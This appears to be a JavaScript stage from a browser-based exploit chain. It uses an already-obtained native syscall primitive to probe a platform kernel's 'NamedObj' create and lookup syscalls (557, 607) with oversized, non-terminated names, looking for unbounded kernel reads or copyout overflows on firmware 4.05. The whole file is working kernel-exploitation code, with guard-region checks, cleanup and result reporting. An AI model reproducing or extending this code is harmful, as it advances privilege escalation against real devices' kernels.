// 557 create-path name-length matrix — the 4.05 NamedObj exploit class.
// The kernel rejects names past a limit (ENAMETOOLONG with NUL-scan past
// ~218), so the limit exists, but the order matters: if the copyin or
// NUL scan happens before the limit check, a huge len over a no-NUL
// buffer makes the kernel walk userland memory unbounded (EFAULT if it
// walks off our mapping; SUCCESS + oversized object if the limit is
// applied only to a later stage). Matrix over lens 0x20..0x10000 with a
// 16KB no-NUL fill; guard region after the fill detects kernel
// copyout overflow into our frame. Every created handle is deleted in
// cleanup. 607 (dynlib name lookup, the other name-keyed syscall) gets
// three of the same shapes. Full restore, PID verified, markers 3 of 8.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !native.frame || !Number.isSafeInteger(native.frameAddress))
    throw new Error("chain_missing");
  var frame = native.frame;
  var address = native.frameAddress;
  var nameOffset = 0x200;
  var fillLength = Math.min(0x4000, frame.length - 0x200 - 0x100);
  var guardOffset = nameOffset + fillLength;
  var guardLength = 0x80;
  var regionEnd = guardOffset + guardLength;
  if (regionEnd > frame.length || fillLength < 0x1000)
    throw new Error("frame_region_too_small");
  var nameAddress = address + nameOffset;
  var original = Array.from(frame.subarray(nameOffset, regionEnd));
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function armNoNul() {
    for (var i = 0; i < fillLength; i++)
      frame[nameOffset + i] = 0x41 + (i & 0x3f);
    frame.fill(0x5a, guardOffset, guardOffset + guardLength);
  }
  function guardBroken() {
    for (var g = 0; g < guardLength; g++)
      if (frame[guardOffset + g] !== 0x5a) return true;
    return false;
  }
  var createdHandles = [];
  function allocLen(len) {
    armNoNul();
    var call = native.call("sys557", [nameAddress, len]);
    var errno = (call.value === -1) ? native.readErrno() : null;
    if (errno === null && call.value > 0 && call.value < 1000000)
      createdHandles.push(call.value);
    return call.value + "/" + (errno === null ? "ok" : errno) +
      "/g" + (guardBroken() ? 1 : 0);
  }
  function lookupLen(len) {
    armNoNul();
    var call = native.call("sys607", [nameAddress, len]);
    var errno = (call.value === -1) ? native.readErrno() : null;
    return call.value + "/" + (errno === null ? "ok" : errno) +
      "/g" + (guardBroken() ? 1 : 0);
  }
  function del(id) {
    var call = native.call("sys558", [id, 0, 0]);
    var errno = (call.value === -1) ? native.readErrno() : null;
    return call.value + "/" + (errno === null ? "ok" : errno);
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("lenmat_preflight");
  phase = "matrix";
  var lens = [0x20, 0x3f, 0x40, 0x7f, 0xff, 0x100, 0x1000, 0x10000];
  var matrix = "";
  for (var m = 0; m < lens.length; m++)
    matrix += lens[m].toString(16) + ":" + allocLen(lens[m]) + " ";
  phase = "lookup";
  var lookups = "";
  var lookLens = [0x100, 0x1000, 0x10000];
  for (var l = 0; l < lookLens.length; l++)
    lookups += lookLens[l].toString(16) + ":" + lookupLen(lookLens[l]) + " ";
  mark("lenmat_matrix_done");
  phase = "cleanup";
  var cleanup = "";
  for (var c = 0; c < createdHandles.length; c++)
    cleanup += createdHandles[c].toString(16) + ":" +
      del(createdHandles[c]) + " ";
  mark("lenmat_cleanup_done");
  for (var r = 0; r < original.length; r++)
    frame[nameOffset + r] = original[r];
  var restored = true;
  for (var r2 = 0; r2 < original.length; r2++)
    if (frame[nameOffset + r2] !== original[r2]) { restored = false; break; }
  var after = native.call("getpid", []);
  result = { id: "lenmatrix_v1",
    status: (after.value === before.value && after.high === 0 &&
      restored) ? "pass" : "fail",
    details: { matrix: matrix.trim(),
      lookups: lookups.trim(),
      created: String(createdHandles.length),
      cleanup: cleanup.trim().slice(0, 400),
      fill_len: fillLength,
      pid_ok: after.value === before.value && after.high === 0,
      region_restored: restored } };
} catch (error) {
  result = { id: "lenmatrix_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
